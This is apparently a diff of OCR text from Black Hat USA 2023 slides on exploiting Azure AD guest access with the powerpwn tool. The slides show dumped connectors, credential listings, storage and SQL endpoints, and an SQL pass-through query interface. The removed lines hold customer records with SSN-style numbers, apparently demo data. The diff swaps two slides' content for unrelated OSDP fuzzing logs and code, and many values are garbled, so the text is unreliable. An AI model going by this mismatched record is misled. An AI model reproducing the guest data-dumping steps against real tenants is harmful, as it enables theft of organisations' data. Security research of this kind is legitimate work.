-shared_azurequeues.json shared_logicflows.json shared_powerappsforappmakers. json
-shared_azuretables.json shared_msnweather. json shared_rss.json
 shared_commondataserviceforapps.json shared_office365.json shared_sql.json
 ```
 
@@ -3694,20 +3198,15 @@ shared_commondataserviceforapps.json shared_office365.json shared_sql.json
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 (.venv) @mbrg@: /bhusa23/all-you-need-is-guest$ ls -.cache
-(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ ls .cache/resources/Default -fc993bOFf -345b-4d01-9f67 -9ac4a140dd43/connector/
 shared_azureblob.json shared_flowmanagement.json shared_office365users.json shared_twitter.json
 shared_azurefile.json shared_ftp.json shared_outlooktasks.json shared_yammer.json
-shared_azurequeues. json shared_logicflows.json shared_powerappsforappmakers. json
-shared_azuretables.json shared_msnweather. json shared_rss.json
 shared_commondataserviceforapps.json shared_office365.json shared_sql.json
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ ls .cache/data/Default -fc993b0f -345b-4d01-9f67-9ac4a140dd43/connections/shared
-_sql/e09F5ad0908a497 F8abeeaaa8efc5692/table/
 default-Customers.json default-sys.database firewall _rules.json default-sys.ipv6 database firewall_rules.json
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$
 ```
@@ -3716,20 +3215,14 @@ default-Customers.json default-sys.database firewall _rules.json default-sys.ipv
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn gui
-"SV\ANNAV//| 'LN
-V JLNANNINI SS |
-J} |.) |\V v/
 |
 |
-II QOtvv vz
 | |
-/\_/ \INI \ _/ VIN Il
 2023-07-28 11:06:13 | powerpwn | INFO | Application is running on http://127.0.0.1:5000
 * Serving Flask app ‘powerpwn.powerdump.gui.gui'
 * Debug mode: off
@@ -3739,12 +3232,10 @@ II QOtvv vz
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20e53
 powerpwn - Applications
 e All Resources
 © Credentials
@@ -3753,21 +3244,15 @@ e Applications
 © Connectors
 Display name Environment Version Created by Created at Last modified at
 Customer Insights Default- 2022-07- jamier@zenitydemo.onmicrosoft.com 2022-07-14 2023-07-11
-fc993b0f-345b- 14T08:47:48Z 08:47:48.843904+00:00 21:06:25.166828+00:00
 4d01-9f67-
 9ac4a140dd43
 Shoutout Default- 2023-07- jamier@zenitydemo.onmicrosoft.com 2023-07-29 2023-07-30
-fc993b0f-345b- = 301 14:53:55Z 20:20:17.076311+00:00 14:54:01.485639+00:00
 4d01-9f67-
 9ac4a140dd43
 lanasapp Default- 2023-07- lanas@zenity.io 2023-07-23 2023-07-23
-fc993b0f-345b- = 237 12:49:05Z 12:49:05.202463+00:00 12:49:05.243719+00%00
 4d01-9f67-
-ic
-\—
 0
 =
-ve)
 =
 70
 =
@@ -3777,35 +3262,26 @@ ve)
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20253
 powerpwn - Applications
 e Applications
 e Connectors
 Display name Environment Version Created by Created at Last modified at
 Customer Insights Default- 2022-07- jamier@zenitydemo.onmicrosoft.com 2022-07-14 2023-07-11
-fc993b0f-345b- 14T08:47:48Z 08:47:48.843904+00:00 21:06:25.166828+00:00
 4d01-9f67-
 9ac4a140dd43
 Shoutout Default- 2023-07- jamier@zenitydemo.onmicrosoft.com 2023-07-29 2023-07-30
-fc993b0f-345b- = 301 14:53:55Z 20:20:17.076311+00:00 14:54:01.485639+00:00
 4d01-9f67-
 9ac4a140dd43
 lanasapp Default- 2023-07- lanas@zenity.io 2023-07-23 2023-07-23
-fc993b0f-345b- = 237 12:49:05Z 12:49:05.202463+00:00 12:49:05.243719+0G00 —
 4d01-9f67-
 0
-a
 =
-ve)
-&
 =
 70
-hay
 =
 ```
 
@@ -3813,12 +3289,10 @@ hay
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20253
 powerpwn - Credentials
 All Resources
 Credentials
@@ -3845,12 +3319,10 @@ Playground
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20253
 powerpwn - Credentials
 All Resources
 Credentials
@@ -3868,7 +3340,6 @@ shared
 azurequeues
 shared
 sql
-shared sql
 https://enterpriseip.blob.core.windows.net/patentarchive
 jamieredingcustomerdata.table.core.windows.net/customers
 Azure Queues
@@ -3892,15 +3363,12 @@ Playground
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20253
 powerpwn - Credentials
 e All Resources
-® Credentials
 e Automations
 e Applications
 © Connectors
@@ -3919,28 +3387,23 @@ customercareinsights.database.windows.net
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 67/100 on the text kept, 55/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 cache / data / Defaullt-fe93b0t-345b=4 ela /
-connections / shared|_s gl / fi47194e3S57e459b875 £59ee
 |$ Mimetype Modified
-BH table 8 Z| inode/directory 2023.07.28 11:09:36
 ```
 
 ## Slide 176
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 71/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 «cache / data / Defaullt-f993b0f-345b-4d01-9167-9ac4al4odd4s /
-counestions /shared_sqll / ft47194e357e459bS7SCaSt43159ceeG /
 table
 Name 1} Mimetype Modified Size
 [) default-Customers.json application/json 2023.07.28 11:09:35 23.92 KiB
@@ -3952,56 +3415,53 @@ C) default-sys.ipv6 database firewall _rules.json Gg application/json 2023.07.28
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 70/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-USA 20e53
-[{"@odata.etag": "", "“ItemInternalId": "7eb41684-4b64-4f39-9eab-90fbe3Oba62c", "CustomerID": 34553, "FirstName": "Jamie", “LastName”:
-"Reding", “Email”: "“jamier@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-1111"}, {"@odata.etag": "", "“ItemInternalId":
-"566a2e62-1c95-4e49-bdc6-c141023d66ac", "CustomerID": 98256, "FirstName": "Christa", “LastName”: "Geller", "Email":
-“christag@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-2222"}, {"@odata.etag": "", "“ItemInternalId": "43288280-ae24-450e-
-9feb-f6605d9c1lec2", "“CustomerID": 76234, "FirstName": "David", "LastName": "Brenner", "Email": “davidb@zenitydemo.OnMicrosoft.com",
-"SocialSecurityNumber": "209-97-3333"}, {"@odata.etag": "", “ItemInternalId": "52f7ad4a-9159-486e-885c-69c78fa59138", "CustomerID": 43256,
-"FirstName": "Laura", “LastName": "Miller", "Email": "“lauram@zenitydemo.OnMicrosoft.com", "“SocialSecurityNumber": "209-97-4444"},
-{"@odata.etag": "", “ItemInternalId": "e53da160-f087-4e08-b3fb-eb16283781c5", "CustomerID": 67322, "FirstName": "Robert", “LastName”:
-"Thompson", “Email”: "“robertt@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber"™: "2@9-97-5555"}, {"@odata.etag": "", "ItemInternalId":
-"f6ce@c32-b846-4c4a-ad61-2f3bf74d0de6", “CustomerID": 78654, "FirstName": "Amanda", "LastName": "Smith", “Email”:
-“amandas@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-6666"}, {"@odata.etag": "", “ItemInternalId": "e998798e-2e21-408Ff -
-b3e6-2ff7fde41510", “CustomerID": 89322, "FirstName": "John", “LastName”: "Davis", "Email": "“johnd@zenitydemo.OnMicrosoft.com",
-"SocialSecurityNumber": "209-97-7777"}, {"@odata.etag": "", "“ItemInternalId": "9219f@91-1238-4cf8-b9a7-f4b7e3f3a958", "CustomerID": 11245,
-"FirstName": "Emily", "LastName": "Harris", "Email": "emilyh@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-8888"},
-{"@odata.etag": "", “ItemInternalId": "8ba98fcc-b7f8-401f-abf5-842065f37d56", "CustomerID": 55677, "FirstName": "Michael", "LastName":
-"Sanders", "Email": “michaels@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "2@9-97-9999"}, {"@odata.etag": "", "“ItemInternalId":
-"4255a25-@f8d-4295-a3bf-7ab0388f8d7a", "CustomerID": 68984, "FirstName": "Sophie", “LastName": "Carter", "Email":
-“sophiec@zenitydemo.OnMicrosoft.com", "“SocialSecurityNumber": "209-97-0000"}, {"@odata.etag": "", "“ItemInternalId": "07c@f4f1-1b45-4ed4-
-ba@5-9al1a6c15768f", “CustomerID": 45779, "FirstName": "Stephen", “LastName”: "Williams", "Email": "“stephenw@zenitydemo.OnMicrosoft.com",
-"SocialSecurityNumber": "209-97-1234"}, {"@odata.etag": "", "“ItemInternalId": "e270c995-1132-4900-afe1-f745fdb38452", "CustomerID": 23456,
-"FirstName": "Olivia", "LastName": “Lee", "Email": "olivial@zenitydemo.OnMicrosoft.com", "“SocialSecurityNumber": "2@9-97-4321"},
-{"@odata.etag": "", “ItemInternalId": "6bdalalf-b705-4a3d-a392-856c9c286c73", "CustomerID": 64784, "FirstName": "Patricia", “LastName”:
-"Foster", “Email”: "“patriciaf@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "2@9-97-9876"}, {"@odata.etag": "", "ItemInternalId":
-"9dd9e288-b96d-45de-9b3d-5bd7572e8cc4", “CustomerID": 34598, "FirstName": "Daniel", “LastName”: "Brown", “Email”:
-“danielb@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-6789"}, {"@odata.etag": "", “ItemInternalId": "b6884c5e-3c43-49ca-
-b341-aef@cfefSeff", “CustomerID": 79000, "FirstName": "Elizabeth", "LastName": "Perez", “Email”: “elizabethp@zenitydemo .OnMicrJea6s ooo
-"SocialSecurityNumber": "209-97-7890"}, {"@odata.etag": "", "“ItemInternalId": "9a2650d6-693a-45e8-b8@c-4995a9d@54af", "“Customel™ . oy
-"FirstName": "Jason", "LastName": "Mitchell", "Email": "jasonm@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-@9 a
-{"@odata.etag": "", “ItemInternalId": "bc932b1b-5ff2-4c8d-a28f-6ac86eed4529", “CustomerID": 74321, "FirstName": "Sarah", "Last
-"Gonzalez", “Email": "“sarahg@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-5678"}, {"@odata.etag": "", "“ItemInt
-"12857b5e-8cdc-49ee-961d-2b47adb1if6ae", "CustomerID": 97654, "FirstName": "Thomas", "LastName": "Martin", "Email":
-eS ee ee a ee Newt tee eee tae nan At adage \eua-4a-2a- -42- nm. oun Ure i ret LIN. NEEL a fean Lan anor
+FUZZ MODE
+
+- Custom mutation primitives.
+- Easy to extend.
+- Auto-crash detection
+
+[terminal panel - ariel.harush]
+[illegible - one line clipped by the panel header]
+2023-06-18 03:40:27,374 cp -> pd:
+b'5318070000602e5319070000602d531a070000602c531b070000602b531c070000602a531d0700006029531e0700006028531f070000602753200700006026532107000060255322070[cut off by slide edge]
+00601e5329070000601d532a070000601c532b070000601b532c070000601a532d0700006019532e0700006018532f07000060175330070000601653310700006015533207000060145333[cut off by slide edge]
+2023-06-18 03:40:27,425 cp -> pd: b'53360700006010'
+2023-06-18 03:40:27,446 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,492 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,538 pd -> cp: b'538f18000450a0c9538f08000440a0c9538f0800044098e6' (original:b'538f08000440a0c9538f08000440a0c9538f08000440a0c9') ap[cut off by slide edge]
+2023-06-18 03:40:27,583 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,629 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,675 pd -> cp: b'538f18000450a0c9538f08000440a0c9538f0800044098e6' (original:b'538f08000440a0c9538f08000440a0c9538f08000440a0c9') ap[cut off by slide edge]
+2023-06-18 03:40:27,721 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,767 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,813 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,859 pd -> cp: b'538f18000450a0c9538f08000440a0c9538f0800044098e6' (original:b'538f08000440a0c9538f08000440a0c9538f08000440a0c9') ap[cut off by slide edge]
+2023-06-18 03:40:27,905 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,951 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:40:27,996 pd -> cp: b'538f18000450a0c9538f08000440a0c9538f0800044098e6' (original:b'538f08000440a0c9538f08000440a0c9538f08000440a0c9') ap[cut off by slide edge]
+2023-06-18 03:40:28,046 pd -> cp: b'538f0800045091db' (original:b'538f08000440a0c9') applied mutation message_code_50
+2023-06-18 03:48:11,022 ***** crash detected timeout: 462.97612953186035
+
+[code panel - ariel.harush]
+def pri_invert_control_SCB(msg: OSDPMessage):
+    msg.CTRL_SCB = not msg.CTRL_SCB
+    msg.recalculate_all()
 ```
 
 ## Slide 178
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 70/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 ache / data / Defaullt-feO93b0t
-b=4dO1-9i67-Yacdaldo0ddas /
 / Shared_sql
 Name 14 Mimetype Modified Size
 BE 009f5ad0908a497f8abeeaaa8efcS692 inode/directory 2023.07.28 11:09:31
@@ -4012,12 +3472,10 @@ Ba ££47194e357e459b8756a5£43£59ccc6 inode/directory 2023.07.28 11:09:35
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20253
 powerpwn - Credentials
 All Resources
 Credentials
@@ -4025,7 +3483,6 @@ Automations
 Playground
 Playground | Raw Dump
 Playground | Raw Dump
-Playground |} Raw Dump
 Playground |} Raw Dump
 e Applications
 e Connectors
@@ -4043,11 +3500,10 @@ customercareinsights.database.windows.net
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 ® Swagger /api/shared_sql/ff47194e357e459b8756a5f43f59ccc6/swagger.json
 Supported by SMARTBEAR
 SQL Server@
@@ -4056,7 +3512,6 @@ Microsoft SQL Server is a relational database management system developed by Mic
 get, and delete on rows in a table.
 Schemes
 HTTPS v
-SqlDataSetsMetadata
 /#£47194e357e459b8756a5F43f59ccc6/$metadata.json/datasets Get datasets metadata
 ```
 
@@ -4064,41 +3519,37 @@ SqlDataSetsMetadata
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 71/100 on the text kept, 62/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-2)
-black hat
-USA 20e53
-SqlProcedure “A
-/¥£47194e357e459b8756a5F43f59ccc6/datasets({dataset})/procedures Get stored procedures Vv
-/#£47194e357e459b8756a5f43f59ccc6/datasets({dataset})/procedures({procedure}) Execute stored procedure Vv
-/££47194e357e459b8756a5F43f59ccc6/datasets/default/procedures Get stored procedures Vv
-/££47194e357e459b8756a5f43f59ccc6/datasets/default/procedures/{procedure} Execute stored procedure Vv
-SqlPass ThroughNativeQuery A
-/££47194e357e459b8756a5f43f59ccc6/datasets({dataset}) /query({language}) Vv
-Vv
-SqlTableData “~
-/¥£47194e357e459b8756a5f43Ff59ccc6/datasets({dataset})/tables({table})/items Getrows
-/¥£47194e357e459b8756a5F43f59ccc6/datasets({dataset})/tables({table})/items Insert row
-SBS /££47194e357e459b8756a5F43F59ccc6/datasets({dataset})/tables({table})/items({id}) Delete row
-CC
+FUZZ Example
+
+pd -> cp: b'53e508000440d296' (original:b'53e508000440d29653e508000440d29653e508000440d296') applied mutation remove_payload
+pd -> cp: b'53e508000440d296'
+pd -> cp: b'53e5100004b7d29653e50800044041cb' (original:b'53e508000440d29653e508000440d296') applied mutation random_message_code
+pd -> cp: b'53e5100004b7d29653e50800044041cb'
+pd -> cp: b'b8e510000440d29653e50800044045e9' (original:b'53e508000440d29653e508000440d296') applied mutation random_som
+pd -> cp: b'b8e510000440d29653e50800044045e9'
+pd -> cp: b'53e510000440d29653e50800044081ae' (original:b'53e508000440d29653e508000440d296') applied mutation random_size
+pd -> cp: b'53e510000440d29653e50800044081ae'
+pd -> cp: b'53e518000040d29653e508000440d29653e50800044098' (original:b'53e508000440d29653e508000440d29653e508000440d296') applied mutation invert_control_crc
+pd -> cp: b'53e518000040d29653e508000440d29653e50800044098'
+pd -> cp: b'53e510000401d29653e50800044079da' (original:b'53e508000440d29653e508000440d296') applied mutation message_code_all
+pd -> cp: b'53e510000401d29653e50800044079da'
+pd -> cp: b'53e588000450ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff56d2' (original:b'53e508000440d29653e508000440d296') applied mutation trigger_overflow
+pd -> cp: b'53e588000450ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff56d2'
 ```
 
 ## Slide 182
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20253
 SqlPassThroughNativeQuery
-/¥£47194e357e459b8756a5F43f59ccc6/datasets({dataset}) /query({language})
-TaN
-nw
 Parameters Try it out
 Name Description
 dataset *
@@ -4106,7 +3557,6 @@ dataset *
 string
 (path)
 language *
-aerine language
 (path)
 query *
 object
@@ -4117,14 +3567,11 @@ Example Value Model
 “additionalProp1":
 “additionalProp2":
 “additionalProp3":
-},
-“formalParameters"
 “additionalProp1
 “additionalProp2":
 “additionalProp3":
 : “string”
 Parameter content type
-c )
 ```
 
 ## Slide 183
@@ -4144,16 +3591,6 @@ PowerGuest: AAD Guest Exploitation Beyond Enumeration
 @mbrg0
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifek hat
-USA &
-Defense
-@mbrgO
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 185
 
@@ -4407,10 +3844,10 @@ Michael Bargury @mbrg0 Zenity
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifek hat
 USA &
 AUGUST 9-10, ©0253
 BRIEFINGS
